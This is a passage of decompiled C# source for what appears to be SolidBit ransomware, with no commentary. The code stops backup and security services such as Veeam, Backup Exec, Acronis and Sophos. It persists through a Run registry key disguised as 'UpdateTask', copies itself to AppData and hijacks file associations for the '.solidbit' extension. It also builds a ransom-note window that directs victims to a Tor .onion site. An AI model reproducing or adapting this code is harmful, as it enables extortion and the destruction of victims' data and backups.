			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	private static void smethod_5()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private void method_9(string string_4)
	{
		if (string_4 != "")
		{
			try
			{
				string text = Path.GetTempPath() + method_4(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(string_4));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}

	private static void smethod_6()
	{
		try
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + AppDomain.CurrentDomain.FriendlyName;
			if (location != text)
			{
				byte[] bytes = File.ReadAllBytes(location);
				File.WriteAllBytes(text, bytes);
				SetAssociation_User("solidbit", text, "Solid");
			}
		}
		catch
		{
		}
	}

	private static bool smethod_7()
	{
		try
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + AppDomain.CurrentDomain.FriendlyName;
			if (location == text)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void SetAssociation_User(string Extension, string OpenWith, string ExecutableName)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\", writable: true))
			{
				using RegistryKey registryKey6 = registryKey.CreateSubKey("." + Extension);
				using RegistryKey registryKey2 = registryKey.CreateSubKey(Extension + "_auto_file");
				using RegistryKey registryKey7 = registryKey2.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
				using RegistryKey registryKey8 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\", writable: true);
				using RegistryKey registryKey3 = registryKey.CreateSubKey("Applications");
				using RegistryKey registryKey4 = registryKey3.CreateSubKey(ExecutableName);
				using RegistryKey registryKey9 = registryKey4.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command");
				using RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\." + Extension);
				using RegistryKey registryKey10 = registryKey5.OpenSubKey("UserChoice");
				registryKey6.SetValue("", Extension + "_auto_file", RegistryValueKind.String);
				registryKey.SetValue("", Extension + "_auto_file", RegistryValueKind.String);
				registryKey.CreateSubKey(Extension + "_auto_file");
				registryKey7.SetValue("", "\"" + OpenWith + "\" \"%1\"");
				registryKey8.SetValue(Extension + "_auto_file_." + Extension, 0);
				registryKey8.SetValue("Applications\\" + ExecutableName + "_." + Extension, 0);
				registryKey9.SetValue("", "\"" + OpenWith + "\" \"%1\"");
				registryKey5.CreateSubKey("OpenWithList").SetValue("a", ExecutableName);
				registryKey5.CreateSubKey("OpenWithProgids").SetValue(Extension + "_auto_file", "0");
				if (registryKey10 != null)
				{
					registryKey5.DeleteSubKey("UserChoice");
				}
				registryKey5.CreateSubKey("UserChoice").SetValue("ProgId", "Applications\\" + ExecutableName);
			}
			SHChangeNotify(134217728u, 0u, IntPtr.Zero, IntPtr.Zero);
		}
		catch
		{
			try
			{
				SHChangeNotify(134217728u, 0u, IntPtr.Zero, IntPtr.Zero);
			}
			catch
			{
			}
		}
	}

	[DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0320: Unknown result type (might be due to invalid IL or missing references)
		//IL_032a: Expected O, but got Unknown
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Expected O, but got Unknown
		//IL_04ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d8: Expected O, but got Unknown
		//IL_0515: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06be: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c8: Expected O, but got Unknown
		//IL_0760: Unknown result type (might be due to invalid IL or missing references)
		//IL_076a: Expected O, but got Unknown
		//IL_0951: Unknown result type (might be due to invalid IL or missing references)
		//IL_095b: Expected O, but got Unknown
		//IL_09ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f8: Expected O, but got Unknown
		//IL_0a7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a89: Expected O, but got Unknown
		//IL_0b0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b19: Expected O, but got Unknown
		//IL_0baf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb9: Expected O, but got Unknown
		//IL_0c3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c49: Expected O, but got Unknown
		//IL_0d84: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e02: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Panel val = (panel1 = new Panel());
		Panel val2 = (panel2 = new Panel());
		Label val3 = (label5 = new Label());
		Label val4 = (label4 = new Label());
		PictureBox val5 = (pictureBox2 = new PictureBox());
		Label val6 = (label1 = new Label());
		Panel val7 = (panel3 = new Panel());
		Panel val8 = (panel4 = new Panel());
		Label val9 = (label3 = new Label());
		Label val10 = (label2 = new Label());
		PictureBox val11 = (pictureBox1 = new PictureBox());
		Panel val12 = (panel6 = new Panel());
		LinkLabel val13 = (linkLabel1 = new LinkLabel());
		Label val14 = (label9 = new Label());
		Label val15 = (label8 = new Label());
		LinkLabel val16 = (linkLabel4 = new LinkLabel());
		Label val17 = (label7 = new Label());
		Label val18 = (label6 = new Label());
		PictureBox val19 = (pictureBox3 = new PictureBox());
		Panel val20 = (panel5 = new Panel());
		Label val21 = (label10 = new Label());
		((Control)panel1).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)panel3).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel6).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((Control)panel5).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.WhiteSmoke);
		panel1.set_BorderStyle((BorderStyle)1);
		((Control)panel1).get_Controls().Add((Control)(object)panel2);
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(8, 188));
		((Control)panel1).set_Margin(new Padding(50, 30, 3, 3));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Padding(new Padding(10, 0, 0, 0));
		((Control)panel1).set_Size(new Size(725, 136));
		((Control)panel1).set_TabIndex(0);
		((Control)panel2).set_BackColor(Color.White);
		((Control)panel2).get_Controls().Add((Control)(object)label5);
		((Control)panel2).get_Controls().Add((Control)(object)label4);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel2).set_Location(new Point(3, 3));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(717, 128));
		((Control)panel2).set_TabIndex(1);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Black);
		((Control)label5).set_Location(new Point(37, 47));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(534, 40));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text("To make sure that we REALLY CAN recover data - we offer you to decrypt \r\nsamples. You can recover all your files safely and easily with us.");
		label5.set_TextAlign((ContentAlignment)2);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Green);
		((Control)label4).set_Location(new Point(217, 9));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(257, 24));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Free decryption as guarantee");
		pictureBox2.set_Image((Image)(object)Class6.smethod_0());
		((Control)pictureBox2).set_Location(new Point(625, 20));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(73, 76));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.White);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Green);
		((Control)label1).set_Location(new Point(169, 4));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Padding(new Padding(5));
		((Control)label1).set_Size(new Size(397, 43));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("SOLIDBIT RANSOMWARE");
		((Control)panel3).set_BackColor(Color.WhiteSmoke);
		panel3.set_BorderStyle((BorderStyle)1);
		((Control)panel3).get_Controls().Add((Control)(object)panel4);
		((Control)panel3).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel3).set_Location(new Point(8, 51));
		((Control)panel3).set_Margin(new Padding(50, 28, 3, 3));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Padding(new Padding(10, 0, 0, 0));
		((Control)panel3).set_Size(new Size(725, 132));
		((Control)panel3).set_TabIndex(2);
		((Control)panel4).set_BackColor(Color.White);
		((Control)panel4).get_Controls().Add((Control)(object)label3);
		((Control)panel4).get_Controls().Add((Control)(object)label2);
		((Control)panel4).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel4).set_Location(new Point(3, 3));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(717, 124));
		((Control)panel4).set_TabIndex(1);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Black);
		((Control)label3).set_Location(new Point(98, 33));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(616, 60));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		label3.set_TextAlign((ContentAlignment)2);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Green);
		((Control)label2).set_Location(new Point(273, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(155, 24));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("What happened?");
		pictureBox1.set_Image((Image)(object)Class6.smethod_1());
		((Control)pictureBox1).set_Location(new Point(10, 18));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(84, 82));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)panel6).set_BackColor(Color.White);
		((Control)panel6).get_Controls().Add((Control)(object)linkLabel1);
		((Control)panel6).get_Controls().Add((Control)(object)label9);
		((Control)panel6).get_Controls().Add((Control)(object)label8);
		((Control)panel6).get_Controls().Add((Control)(object)linkLabel4);
		((Control)panel6).get_Controls().Add((Control)(object)label7);
		((Control)panel6).get_Controls().Add((Control)(object)label6);
		((Control)panel6).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panel6).set_Location(new Point(3, 3));
		((Control)panel6).set_Name("panel6");
		((Control)panel6).set_Size(new Size(713, 133));
		((Control)panel6).set_TabIndex(1);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		linkLabel1.set_LinkColor(Color.Navy);
		((Control)linkLabel1).set_Location(new Point(111, 99));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(537, 20));
		((Control)linkLabel1).set_TabIndex(11);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.Black);
		((Control)label9).set_Location(new Point(111, 70));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(431, 20));
		((Control)label9).set_TabIndex(10);
		((Control)label9).set_Text("Open link in Tor Browser and follow instructions on this page");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Black);
		((Control)label8).set_Location(new Point(556, 40));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(92, 20));
		((Control)label8).set_TabIndex(5);
		((Control)label8).set_Text("and install it");
		((Control)linkLabel4).set_AutoSize(true);
		((Control)linkLabel4).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		linkLabel4.set_LinkColor(Color.Navy);
		((Control)linkLabel4).set_Location(new Point(286, 40));
		((Control)linkLabel4).set_Name("linkLabel4");
		((Control)linkLabel4).set_Size(new Size(264, 20));
		((Control)linkLabel4).set_TabIndex(9);
		linkLabel4.set_TabStop(true);
		((Control)linkLabel4).set_Text("https://www.torproject.org/download/");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Black);
		((Control)label7).set_Location(new Point(111, 40));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(178, 20));
		((Control)label7).set_TabIndex(5);
		((Control)label7).set_Text("Download Tor Browser -");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Green);
		((Control)label6).set_Location(new Point(240, 12));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(169, 24));
		((Control)label6).set_TabIndex(4);
		((Control)label6).set_Text("How to contact us?");
		pictureBox3.set_Image((Image)(object)Class6.smethod_2());
		((Control)pictureBox3).set_Location(new Point(10, 23));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(84, 87));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox3.set_TabIndex(1);
		pictureBox3.set_TabStop(false);
		((Control)panel5).set_BackColor(Color.WhiteSmoke);
		panel5.set_BorderStyle((BorderStyle)1);
		((Control)panel5).get_Controls().Add((Control)(object)panel6);
		((Control)panel5).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel5).set_Location(new Point(12, 331));
		((Control)panel5).set_Margin(new Padding(50, 30, 3, 3));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Padding(new Padding(10, 0, 0, 0));
		((Control)panel5).set_Size(new Size(721, 141));
		((Control)panel5).set_TabIndex(3);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.Black);
		((Control)label10).set_Location(new Point(74, 489));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(573, 40));
		((Control)label10).set_TabIndex(5);
		((Control)label10).set_Text("ATTENTION - Tor Browser may be blocked in your country or corporate network. \r\nUse bridges.torproject.org or use Tor Browser over VPN.");
		label10.set_TextAlign((ContentAlignment)2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(739, 550));
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)panel5);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_MaximumSize(new Size(755, 584));
		((Control)this).set_MinimumSize(new Size(755, 584));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)panel3).ResumeLayout(false);
		((Control)panel4).ResumeLayout(false);
		((Control)panel4).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel6).ResumeLayout(false);
		((Control)panel6).PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		((Control)panel5).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
